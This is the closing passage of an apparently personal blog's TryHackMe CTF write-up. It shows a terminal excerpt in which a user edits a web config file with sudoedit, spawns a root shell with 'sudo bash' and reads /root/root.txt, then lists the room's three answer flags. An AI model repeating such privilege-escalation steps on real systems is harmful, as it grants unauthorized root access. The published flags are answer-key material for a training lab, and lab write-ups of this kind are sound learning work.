+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>curtis</span><span class=err>@</span><span class=n>year</span><span class=o>-</span><span class=n>of</span><span class=o>-</span><span class=n>the</span><span class=o>-</span><span class=n>pig</span><span class=p>:</span><span class=o>~$</span> <span class=n>sudoedit</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>temp</span><span class=o>/</span><span class=n>temp</span><span class=o>/</span><span class=n>config</span><span class=o>.</span><span class=n>php</span>
+</span></span><span class=line><span class=cl><span class=n>curtis</span><span class=err>@</span><span class=n>year</span><span class=o>-</span><span class=n>of</span><span class=o>-</span><span class=n>the</span><span class=o>-</span><span class=n>pig</span><span class=p>:</span><span class=o>~$</span> <span class=n>sudo</span> <span class=n>bash</span>
+</span></span><span class=line><span class=cl><span class=n>root</span><span class=err>@</span><span class=n>year</span><span class=o>-</span><span class=n>of</span><span class=o>-</span><span class=n>the</span><span class=o>-</span><span class=n>pig</span><span class=p>:</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>curtis</span><span class=c1># cat /root/root.txt</span>
+</span></span><span class=line><span class=cl><span class=n>THM</span><span class=p>{</span><span class=n>MjcxNmVmYjNhYzdkZDc0M2RkNTZhNDA0</span><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><ol><li>Flag 1</li></ol><p><code>THM{MDg0MGVjYzFjY2ZkZGMzMWY1NGZiNjhl}</code></p><ol start=2><li>Flag 2</li></ol><p><code>THM{Y2Q2N2M1NzNmYTQzYTI4ODliYzkzMmZh}</code></p><ol start=3><li>Root Flag</li></ol><p><code>THM{MjcxNmVmYjNhYzdkZDc0M2RkNTZhNDA0}</code></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/tryhackme/>Tryhackme</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://s4ch.github.io/>CyFun</a></span>
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
